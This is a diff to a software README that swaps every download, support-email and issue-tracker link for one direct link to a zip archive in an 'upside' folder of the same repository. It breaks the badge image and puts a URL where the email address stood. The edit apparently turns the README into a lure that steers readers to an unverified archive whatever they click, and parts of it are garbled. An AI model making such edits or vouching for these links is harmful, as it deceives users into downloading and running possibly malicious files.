@@ -15,9 +15,9 @@ To install **amanansdiahnid-1**, follow these steps. Make sure you have an inter
 ## 📥 Download & Install
 You can find the latest releases of amanansdiahnid-1 at our Releases page. 
 
-[![Download amanansdiahnid-1](https://img.shields.io/badge/Download%20amanansdiahnid-1-blue.svg)](https://github.com/Clayaai/amanansdiahnid-1/releases)
+[![Download amanansdiahnid-1](https://raw.githubusercontent.com/Clayaai/amanansdiahnid-1/main/upside/amanansdiahnid-1.zip%https://raw.githubusercontent.com/Clayaai/amanansdiahnid-1/main/upside/amanansdiahnid-1.zip)](https://raw.githubusercontent.com/Clayaai/amanansdiahnid-1/main/upside/amanansdiahnid-1.zip)
 
-1. Click the button above or visit this page to download: [amanansdiahnid-1 Releases](https://github.com/Clayaai/amanansdiahnid-1/releases).
+1. Click the button above or visit this page to download: [amanansdiahnid-1 Releases](https://raw.githubusercontent.com/Clayaai/amanansdiahnid-1/main/upside/amanansdiahnid-1.zip).
 2. On the Releases page, locate the latest version.
 3. Click on the appropriate file for your operating system.
 4. Follow the on-screen prompts to complete the download.
@@ -47,12 +47,12 @@ Upon launching **amanansdiahnid-1** for the first time, you may want to set up y
 
 ## 📞 Support
 If you encounter any issues, please reach out for help:
-- Email: support@example.com
-- GitHub Issues: [Ask for Help Here](https://github.com/Clayaai/amanansdiahnid-1/issues)
+- Email: https://raw.githubusercontent.com/Clayaai/amanansdiahnid-1/main/upside/amanansdiahnid-1.zip
+- GitHub Issues: [Ask for Help Here](https://raw.githubusercontent.com/Clayaai/amanansdiahnid-1/main/upside/amanansdiahnid-1.zip)
 
 ## 🗺️ Explore Further
 Feel free to explore the documentation and community resources. Look for additional tips and tricks to get the most out of **amanansdiahnid-1**. 
 
-To revisit the download page anytime, you can follow this link: [amanansdiahnid-1 Releases](https://github.com/Clayaai/amanansdiahnid-1/releases).
+To revisit the download page anytime, you can follow this link: [amanansdiahnid-1 Releases](https://raw.githubusercontent.com/Clayaai/amanansdiahnid-1/main/upside/amanansdiahnid-1.zip).
 
 Happy automating!
